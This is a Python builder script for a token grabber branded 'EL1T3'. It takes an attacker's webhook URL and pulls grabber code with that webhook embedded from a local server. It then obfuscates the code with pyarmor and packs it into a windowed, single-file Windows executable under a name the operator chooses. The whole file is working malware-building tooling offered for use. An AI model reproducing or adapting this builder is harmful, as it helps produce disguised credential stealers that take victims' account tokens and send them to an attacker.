#~~~~                                        ~~~~#
# 'тнe мoѕт αdvαɴced αɴd powerғυl тoĸeɴ ɢrαввer' #
#                ιтѕ_Ѵιcнч#1337                  #
#~~        github.com/Its-Vichy/EL1T3          ~~#
#~~~~                                        ~~~~#

from colorama import Fore, init, Style
import os, requests
init()

def PrintLogo():
    os.system('cls')
    os.system('title [Its-Vichy] EL1T3 Builder - github.com/Its-Vichy/EL1T3')
    print(Style.BRIGHT + Fore.WHITE + '''
       /$$$$$$$$ /$$         /$$ /$$$$$$$$ /$$$$$$ 
      | $$_____/| $$       /$$$$|__  $$__//$$__  $$
      | $$      | $$      |_  $$   | $$  |__/  \ $$
      | $$$$$   | $$        | $$   | $$     /$$$$$/
      | $$__/   | $$        | $$   | $$    |___  $$
      | $$      | $$        | $$   | $$   /$$  \ $$
      | $$$$$$$$| $$$$$$$$ /$$$$$$ | $$  |  $$$$$$/
      |________/|________/|______/ |__/   \______/                                 
    '''.replace('$', f'{Fore.RED}O{Fore.WHITE}'))

class Builder():
    def __init__(self, AppName, Webhook):
        self.AppName = AppName
        self.Webhook = Webhook
    
    def Obfuscate(self):
        with open('stub.py', 'x') as TempFile:
            for line in requests.get(f'http://127.0.0.1:1337/api/GrabberCode/?Webhook={self.Webhook}').text:
                TempFile.writelines(line)
        
        print(f'[{Fore.YELLOW}O{Fore.WHITE}] Please wait....')
        os.system('pyarmor obfuscate ./stub.py')
        os.system('del stub.py')
        PrintLogo()
        print(f'[{Fore.RED}O{Fore.WHITE}] Payload was build please wait....')
    
    def Build(self):
        os.system(f'pyinstaller --noconfirm --onefile --windowed --name "{self.AppName}" --log-level "CRITICAL" --add-data "./dist/pytransform;pytransform/" --hidden-import "EL1T3" "./dist/stub.py')
        os.system(f'cd ./dist/ && move ./{self.AppName}.exe ../ && cd ../ && rmdir /S /Q dist && rmdir /S /Q build && del {self.AppName}.spec')
        PrintLogo()
        print(f'[{Fore.GREEN}O{Fore.WHITE}] {self.AppName}.exe was created !')

PrintLogo()
Build = Builder(input(f'[{Fore.CYAN}?{Fore.WHITE}] App name: '), input(f'[{Fore.CYAN}?{Fore.WHITE}] Webhook: '))
Build.Obfuscate()
Build.Build()